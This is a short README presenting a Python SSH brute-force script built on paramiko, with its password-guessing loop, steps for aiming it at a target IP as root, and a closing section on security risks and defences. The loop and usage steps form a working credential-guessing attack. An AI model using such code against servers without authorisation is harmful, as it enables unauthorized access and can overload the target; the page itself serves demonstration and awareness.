# SSH Brute Force Script

This Python script demonstrates a simple brute force attack on an SSH server using a list of common passwords.

## How it works

The script uses the `paramiko` library to establish an SSH connection to a specified server. It attempts to authenticate using a list of common passwords. If a connection is successful, it prints the password used and stops. If a connection fails, it prints a failure message and tries the next password.

Here is the main loop of the script:

```python3
for password in passwords:
    try:
        # Initialize SSH client
        client = paramiko.SSHClient()
        # Automatically add the server's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Attempt to connect to the server
        client.connect(host, port=22, username=username, password=password)
        print(f"Successfully connected to {host} with password: {password}")
        break
    except paramiko.AuthenticationException:
        print(f"Failed to connect to {host} with password: {password}")
```

## Usage

To use this script, replace `<SERVER_IP>` with the IP address of the target SSH server. The script currently attempts to authenticate as the `root` user, but you can change this by modifying the `username` variable.

The script includes a list of common passwords to try. You can modify this list to suit your needs.

## Security Implications

This script is a simple demonstration of how a brute force attack can be used to gain unauthorized access to an SSH server. It does not include any security measures or error handling, and it should not be used in a real-world scenario.

In a real-world scenario, such a script could be used for malicious purposes. The target server could suffer from resource exhaustion due to the large number of authentication attempts, and if a weak password is used, an attacker could gain unauthorized access to the server.

Always use strong, unique passwords for all user accounts, and consider implementing additional security measures such as two-factor authentication and intrusion detection systems.